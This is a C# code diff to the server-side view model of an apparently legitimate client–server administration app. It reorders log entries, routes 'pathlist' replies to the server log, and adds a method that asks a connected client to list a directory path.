@@ -85,11 +85,19 @@ namespace ADMIN.ViewModels
                         string entry = $"{clientIp}: {clientMessage}";
                         if (!ConnectedClients.Contains(entry))
                         {
-                            // Add the entry to the top of the collection
-                            ConnectedClients.Insert(0, $"[{timestamp}] {entry}");
+                            if (clientMessage.StartsWith("pathlist:"))
+                            {
+                                ServerLogs.Insert(0, entry);
+                            } else
+                            {
+                                // Add the entry to the top of the collection
+                                ConnectedClients.Insert(0, $"[{timestamp}] {entry}");
+                                AppendMessageToLogAsync($"[{timestamp}] {entry}");
+                            }
+                                
+
 
                         }
-                        AppendMessageToLogAsync($"[{timestamp}] {entry}");
                         ReverseCollection();
                     });
                 }
@@ -133,14 +141,14 @@ namespace ADMIN.ViewModels
 
                     await Dispatcher.UIThread.InvokeAsync(() =>
                     {
-                        ServerLogs.Add( $"Command Sent to {ipAddress}: {message}");
+                        ServerLogs.Insert(0,  $"Command Sent to {ipAddress}: {message}");
                     });
                 }
                 catch (Exception ex)
                 {
                     await Dispatcher.UIThread.InvokeAsync(() =>
                     {
-                        ServerLogs.Add($"Send failed to {ipAddress}: {ex.Message}");
+                        ServerLogs.Insert(0, $"Send failed to {ipAddress}: {ex.Message}");
                     });
                 }
             }
@@ -148,7 +156,38 @@ namespace ADMIN.ViewModels
             {
                 await Dispatcher.UIThread.InvokeAsync(() =>
                 {
-                    ServerLogs.Add($"Client {ipAddress} not found.");
+                    ServerLogs.Insert(0, $"Client {ipAddress} not found.");
+                });
+            }
+        }
+        public async Task ViewDirectories(string ipAddress, string path)
+        {
+            if (_clientConnections.TryGetValue(ipAddress, out TcpClient client))
+            {
+                try
+                {
+                    var stream = client.GetStream();
+                    byte[] messageBytes = Encoding.UTF8.GetBytes($"__open_file:{path}");
+                    await stream.WriteAsync(messageBytes, 0, messageBytes.Length);
+
+                    await Dispatcher.UIThread.InvokeAsync(() =>
+                    {
+                        ServerLogs.Insert(0, $"Command Sent to {ipAddress}: {path}");
+                    });
+                }
+                catch (Exception ex)
+                {
+                    await Dispatcher.UIThread.InvokeAsync(() =>
+                    {
+                        ServerLogs.Insert(0, $"Send failed to {ipAddress}: {ex.Message}");
+                    });
+                }
+            }
+            else
+            {
+                await Dispatcher.UIThread.InvokeAsync(() =>
+                {
+                    ServerLogs.Insert(0, $"Client {ipAddress} not found.");
                 });
             }
         }
@@ -179,14 +218,14 @@ namespace ADMIN.ViewModels
 
                 // Optionally notify that the export was successful
                 Console.WriteLine("Log exported successfully!");
-                ServerLogs.Add($"[SUCCESS] Log file path: {filePath}");
+                ServerLogs.Insert(0, $"[SUCCESS] Log file path: {filePath}");
 
             }
             catch (IOException ex)
             {
                 // Handle any exceptions (e.g., file write errors)
                 Console.WriteLine($"Error exporting log: {ex.Message}");
-                ServerLogs.Add($"[FAILED] Export Failed: {ex.Message}");
+                ServerLogs.Insert(0, $"[FAILED] Export Failed: {ex.Message}");
             }
 
         }
